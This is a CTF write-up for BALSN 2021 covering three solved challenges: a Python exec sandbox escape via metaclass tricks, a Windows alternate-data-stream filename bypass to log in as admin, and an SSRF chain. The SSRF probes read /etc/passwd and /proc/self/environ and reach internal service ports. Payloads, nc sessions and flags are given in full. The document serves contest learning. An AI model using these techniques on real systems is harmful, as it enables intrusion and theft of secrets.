---
title: "BALSN 2021 WriteUp"
date: 2021-11-22T00:00:00+08:00
draft: false
github_link: "https://github.com/Jimmy01240397/CTF-writeup/tree/master/balsn-2021-writeup"
author: "Chumy"
tags:
  - CTF
image: /images/CTF.png
description: ""
toc: 
---


# balsn-2021-writeup
## 戰績
![image](https://user-images.githubusercontent.com/57281249/142795491-ff0795d1-44bb-493d-bd42-6d7af82e53f4.png)

![image](https://user-images.githubusercontent.com/57281249/142795573-629c32d0-909f-4ef2-9316-cd585f376883.png)


## Metaeasy
### 題目

![image](https://user-images.githubusercontent.com/57281249/142795079-081b6121-de1a-42a8-b090-c859da245b43.png)
### server code

``` python3
class MasterMetaClass(type):   
    def __new__(cls, class_name, class_parents, class_attr):
        def getFlag(self):
            print('Here you go, my master')
            with open('flag') as f:
                print(f.read())
        class_attr[getFlag.__name__] = getFlag
        attrs = ((name, value) for name, value in class_attr.items() if not name.startswith('__'))
        class_attr = dict(('IWant'+name.upper()+'Plz', value) for name, value in attrs)
        newclass = super().__new__(cls, class_name, class_parents, class_attr)
        return newclass
    def __init__(*argv):
        print('Bad guy! No Flag !!')
        raise 'Illegal'

class BalsnMetaClass(type):
    def getFlag(self):
        print('You\'re not Master! No Flag !!')

    def __new__(cls, class_name, class_parents, class_attr):
        newclass = super().__new__(cls, class_name, class_parents, class_attr)
        setattr(newclass, cls.getFlag.__name__, cls.getFlag)
        return newclass

def secure_vars(s):
    attrs = {name:value for name, value in vars(s).items() if not name.startswith('__')}
    return attrs

safe_dict = {
            'BalsnMetaClass' : BalsnMetaClass,
            'MasterMetaClass' : MasterMetaClass,
            'False' : False,
            'True' : True,
            'abs' : abs,
            'all' : all,
            'any' : any,
            'ascii' : ascii,
            'bin' : bin,
            'bool' : bool,
            'bytearray' : bytearray,
            'bytes' : bytes,
            'chr' : chr,
            'complex' : complex,
            'dict' : dict,
            'dir' : dir,
            'divmod' : divmod,
            'enumerate' : enumerate,
            'filter' : filter,
            'float' : float,
            'format' : format,
            'hash' : hash,
            'help' : help,
            'hex' : hex,
            'id' : id,
            'int' : int,
            'iter' : iter,
            'len' : len,
            'list' : list,
            'map' : map,
            'max' : max,
            'min' : min,
            'next' : next,
            'oct' : oct,
            'ord' : ord,
            'pow' : pow,
            'print' : print,
            'range' : range,
            'reversed' : reversed,
            'round' : round,
            'set' : set,
            'slice' : slice,
            'sorted' : sorted,
            'str' : str,
            'sum' : sum,
            'tuple' : tuple,
            'type' : type,
            'vars' : secure_vars,
            'zip' : zip,
            '__builtins__':None
            }

def createMethod(code):
    if len(code) > 45:
        print('Too long!! Bad Guy!!')
        return
    for x in ' _$#@~':
        code = code.replace(x,'')
    def wrapper(self):
        exec(code, safe_dict, {'self' : self})
    return wrapper

def setName(pattern):
    while True:
        name = input(f'Give me your {pattern} name :')
        if (name.isalpha()):
            break
        else:
            print('Illegal Name...')
    return name

def setAttribute(cls):
    attrName = setName('attribute')
    while True:
        attrValue = input(f'Give me your value:')
        if (attrValue.isalnum()):
            break
        else:    
            print('Illegal value...')
    setattr(cls, attrName, attrValue)

def setMethod(cls):
    methodName = setName('method')
    code = input(f'Give me your function:')       
    func = createMethod(code)
    setattr(cls, methodName, func)

def getAttribute(obj):
    attrs = [attr for attr in dir(obj) if not callable(getattr(obj, attr)) and not attr.startswith("__")]
    x = input('Please enter the attribute\'s name :')
    if x not in attrs:
        print(f'You can\'t access the attribute {x}')
        return
    else:
        try:
            print(f'{x}: {getattr(obj, x)}')
        except:
            print("Something went wrong in your attribute...")
            return
    
def callMethod(cls, obj):
    attrs = [attr for attr in dir(obj) if callable(getattr(obj, attr)) and not attr.startswith("__")]
    x = input('Please enter the method\'s name :')
    if x not in attrs:
        print(f'You can\'t access the method {x}')
        return
    else:
        try:
            print(f'calling method {x}...')
            cls.__dict__[x](obj)
            print('done')
        except:
            print('Something went wrong in your method...')
            return

class Guest(metaclass = BalsnMetaClass):
    pass

if __name__ == '__main__':
    print(f'Welcome!!We have prepared a class named "Guest" for you')
    cnt = 0
    while cnt < 3:
        cnt += 1
        print('1. Add attribute')
        print('2. Add method')
        print('3. Finish')
        x = input("Option ? :")
        if x == "1":
            setAttribute(Guest)
        elif x == "2":
            setMethod(Guest)
        elif x == "3":
            break
        else:
            print("invalid input.")
            cnt -= 1
    print("Well Done! We Create an instance for you !")
    obj = Guest()
    cnt = 0
    while cnt < 3:
        cnt += 1
        print('1. Inspect attribute')
        print('2. Using method')
        print('3. Exit')
        x = input("Option ? :")
        if x == "1":
            getAttribute(obj)
        elif x == "2":
            callMethod(Guest, obj)
        elif x == "3":
            print("Okay...exit...")
            break
        else:
            print("invalid input.")
            cnt -= 1

```

### 目標
使用MasterMetaClass這個MetaClass建立一個class並調用裡面的IWantGETFLAGPlz func

### 限制
* payload 不可超過三行
* payload 一行要低於45字
* payload 不可含[' ', '_', '$', '#', '@', '~']字元

### payload

``` python3
a=b'\x5f\x5f'.decode();self.i=a+'init'+a
self.d=['',(MasterMetaClass,),{self.i:print}]
type(*self.d)('',(),{})().IWantGETFLAGPlz()
```
``` bash
root@jimmyGW:~# nc metaeasy.balsnctf.com 19092
Welcome!!We have prepared a class named "Guest" for you
1. Add attribute
2. Add method
3. Finish
Option ? :2
Give me your method name :aaa
Give me your function:a=b'\x5f\x5f'.decode();self.i=a+'init'+a
1. Add attribute
2. Add method
3. Finish
Option ? :2
Give me your method name :bbb
Give me your function:self.d=['',(MasterMetaClass,),{self.i:print}]
1. Add attribute
2. Add method
3. Finish
Option ? :2
Give me your method name :ccc
Give me your function:type(*self.d)('',(),{})().IWantGETFLAGPlz()
Well Done! We Create an instance for you !
1. Inspect attribute
2. Using method
3. Exit
Option ? :2
Please enter the method's name :aaa
calling method aaa...
done
1. Inspect attribute
2. Using method
3. Exit
Option ? :2
Please enter the method's name :bbb
calling method bbb...
done
1. Inspect attribute
2. Using method
3. Exit
Option ? :2
Please enter the method's name :ccc
calling method ccc...
 () {'getFlag': <function MasterMetaClass.__new__.<locals>.getFlag at 0x7f06a60c2550>}
Here you go, my master
BALSN{Metaclasses_Are_Deeper_Magic_Than_99%_Of_Users_Should_Ever_Worry_About._If_You_Wonder_Whether_You_Need_Them,_You_Don't.-Tim_Peters_DE8560A2}
done
```

### flag
BALSN{Metaclasses_Are_Deeper_Magic_Than_99%_Of_Users_Should_Ever_Worry_About._If_You_Wonder_Whether_You_Need_Them,_You_Don't.-Tim_Peters_DE8560A2}

### 參考
[淺談 Python Metaclass](https://dboyliao.medium.com/%E6%B7%BA%E8%AB%87-python-metaclass-dfacf24d6dd5)

## DarkKnight
### 題目

![image](https://user-images.githubusercontent.com/57281249/142795120-ce0a446a-5e10-4998-bd33-1f72ad9d4eea.png)
### server code

``` python3
import os
import shutil

base_dir = f"C:\\Users\\balsnctf\\Documents\\Dark Knight\\tmp-{os.urandom(16).hex()}"

def init():
    os.mkdir(base_dir)
    os.chdir(base_dir)

    with open("39671", "w") as f:
        f.write("alice\nalice1025")
    with open("683077", "w") as f:
        f.write("bob\nbob0105a")

def password_manager():
    print("use a short pin code to achieve fast login!!")

    while True:
        pin = input("enter a pin code > ")

        if len(pin) > 100:
            print("too long...")
            continue
        
        if "\\" in pin or "/" in pin or ".." in pin or "*" in pin:
            print("what do you want to do?(¬_¬)")
            continue

        flag = True
        for c in pin.encode("utf8"):
            if c > 0x7e or c < 0x20:
                print("printable chars only!!")
                flag = False
                break
        
        if flag:
            break
    
    while True:
        username = input("enter username > ")

        if len(username) > 100:
            print("too long...")
            continue
        for c in username.encode("utf8"):
            if c > 0x7e or c < 0x20:
                print("printable chars only!!")
                flag = False
                break
        
        if flag:
            break
    
    while True:
        password = input("enter password > ")

        if len(password) > 100:
            print("too long...")
            continue
        for c in password.encode("utf8"):
            if c > 0x7e or c < 0x20:
                print("printable chars only!!")
                flag = False
                break
        
        if flag:
            break

    try:
        with open(pin, "w") as f:
            f.write(username + "\n" + password)
        
        print("saved!!")
    except OSError:
        print("pin is invalid!!")

def safety_guard():
    print("safety guard activated. will delete all unsafe credentials hahaha...")
    delete_file = []
    for pin in os.listdir("."):
        safe = True
        with open(pin, "r") as f:
            data = f.read().split("\n")
            if len(data) != 2:
                safe = False
            elif len(data[0]) == 0 or len(data[1]) == 0:
                safe = False
            elif data[0].isalnum() == False or data[1].isalnum() == False:
                safe = False
            elif data[0] == "admin":
                safe = False

        if safe == False:
            os.remove(pin)
            delete_file.append(pin)
    
    print(f"finished. delete {len(delete_file)} unsafe credentials: {delete_file}")

def fast_login():
    while True:
        pin = input("enter a pin code > ")

        if len(pin) > 100:
            print("too long...")
            continue
        
        if "\\" in pin or "/" in pin or ".." in pin:
            print("what do you want to do?(¬_¬)")
            continue

        flag = True
        for c in pin.encode("utf8"):
            if c > 0x7e or c < 0x20:
                print("printable chars only!!")
                flag = False
                break
        
        if flag:
            break
    
    try:
        with open(pin, "r") as f:
            data = f.read().split("\n")
            if len(data) != 2:
                print("unknown error happened??")
                return None, None
            return data[0], data[1]
    except FileNotFoundError:
        print("this pin code is not registered.")
        return None, None

def normal_login():
    while True:
        username = input("enter username > ")

        if len(username) > 100:
            print("too long...")
        elif username.isalnum() == False:
            print("strange username, huh?")
        elif username == "admin":
            print("no you are definitely not (╬ Ò ‸ Ó)")
        else:
            break
    
    while True:
        password = input("enter password > ")

        if len(password) > 100:
            print("too long...")
            continue
        elif password.isalnum() == False:
            print("strange password, huh?")
        else:
            break
    
    return username, password

def login():
    safety_guard()

    while True:
        print("1. fast login")
        print("2. normal login")
        print("3. exit")
        x = input("enter login type > ")
        if x == "1":
            username, password = fast_login()
        elif x == "2":
            username, password = normal_login()
        elif x == "3":
            print("bye-bye~")
            return
        else:
            print("invalid input.")
            continue

        if username != None and password != None:
            print(f"hello, {username}.")
            if username == "admin":
                while True:
                    x = input("do you want the flag? (y/n): ")
                    if x == "n":
                        print("OK, bye~")
                        return
                    elif x == "y":
                        break
                    else:
                        print("invalid input.")
                while True:
                    x = input("beg me: ")
                    if x == "plz":
                        print("ok, here is your flag: BALSN{flag is here ...}")
                        break
            return

def main():
    init()

    try:
        while True:
            print("1. passord manager")
            print("2. login")
            print("3. exit")
            x = input("what do you want to do? > ")
            if x == "1":
                password_manager()
            elif x == "2":
                login()
            elif x == "3":
                print("bye-bye~")
                break
            else:
                print(f"invalid input: {x}")
    except KeyboardInterrupt:
        print("bye-bye~")
    except:
        print("unexpected error occured.")

    os.chdir("../")
    shutil.rmtree(base_dir)

if __name__ == "__main__":
    main()
```

### 目標
使用login選項成功登入admin

### 限制
* 用 normal_login 會直接被檔
* login 前，所有在 passord manager 所建立的 fast_login 檔若包含'admin'會被刪
* 做 passord manager 時 pin(filename) 不可包含['\\', '/', '..', '*'] 字串

### payload
因為 server 是 windows os ，所以可以用alternate_stream_name繞過 如：C:\user\docs\somefile.ext:alternate_stream_name

``` bash
root@jimmyGW:~# nc darkknight.balsnctf.com 8084
1. passord manager
2. login
3. exit
what do you want to do? > 1
use a short pin code to achieve fast login!!
enter a pin code > 39671:aaa
enter username > admin
enter password > aaaa
saved!!
1. passord manager
2. login
3. exit
what do you want to do? > 2
safety guard activated. will delete all unsafe credentials hahaha...
finished. delete 0 unsafe credentials: []
1. fast login
2. normal login
3. exit
enter login type > 1
enter a pin code > 39671:aaa
hello, admin.
do you want the flag? (y/n): y
beg me: plz
ok, here is your flag: BALSN{however_Admin_passed_the_Dark_knight_with_hiding_behind_Someone}
1. passord manager
2. login
3. exit
what do you want to do? > 3
bye-bye~
```

### flag
BALSN{however_Admin_passed_the_Dark_knight_with_hiding_behind_Someone}

### 參考
[Introduction to ADS – Alternate Data Streams](https://hshrzd.wordpress.com/2016/03/19/introduction-to-ads-alternate-data-streams/)

## DarkKnight
### 題目

![image](https://user-images.githubusercontent.com/57281249/142795163-a834a3c8-d34a-4aed-bcfc-9c3ba5520a99.png)

### 解題
進來看到這個
![image](https://user-images.githubusercontent.com/57281249/142795197-a049ab6f-1d15-43d9-b417-54a3ee54db4f.png)

試著 http://proxy.balsnctf.com/query?site=http://www.google.com
![image](https://user-images.githubusercontent.com/57281249/142795222-e11076c6-6fa7-493e-9dd0-8b40d8f3adf6.png)

試著 ssrf  http://proxy.balsnctf.com/query?site=file:///etc/passwd
![image](https://user-images.githubusercontent.com/57281249/142795236-522dd390-14cb-442b-ac1d-7221e7fb1ec5.png)

試著 http://proxy.balsnctf.com/query?site=file:///proc/self/environ
![image](https://user-images.githubusercontent.com/57281249/142795255-13689cc5-9a1f-4e64-9f81-b986e01af138.png)

試著 http://proxy.balsnctf.com/query?site=file:///proc/net/tcp
![image](https://user-images.githubusercontent.com/57281249/142795276-6d3bd2de-7fd7-4077-bc8f-d2278f4cb6f2.png)

試著 http://proxy.balsnctf.com/query?site=http://127.0.0.1:15000
![image](https://user-images.githubusercontent.com/57281249/142795294-50e342dc-500b-43ec-8241-668dd110e0b0.png)

試著 http://proxy.balsnctf.com/query?site=http://127.0.0.1:15000/stats
![image](https://user-images.githubusercontent.com/57281249/142795368-4b9539c1-702b-4209-af46-7158f9f4362a.png)

試著 http://proxy.balsnctf.com/query?site=http://0X0A2C03F0:39307
![image](https://user-images.githubusercontent.com/57281249/142795389-217d6af0-0418-4c8b-ae17-05aa3bcd09ee.png)

試著 http://proxy.balsnctf.com/query?site=http://0X0A2C03F0:39307/flag

炸
![image](https://user-images.githubusercontent.com/57281249/142795401-d274d047-1b98-4180-bc4c-60860610af34.png)

試著 http://proxy.balsnctf.com/query?site=http://0X0A2C03F0:39307//flag

過
![image](https://user-images.githubusercontent.com/57281249/142795421-f5b07089-8ff3-4796-b1e3-f02de4d24734.png)

### flag
BALSN{default_istio_service_mesh_envoy_configurations}
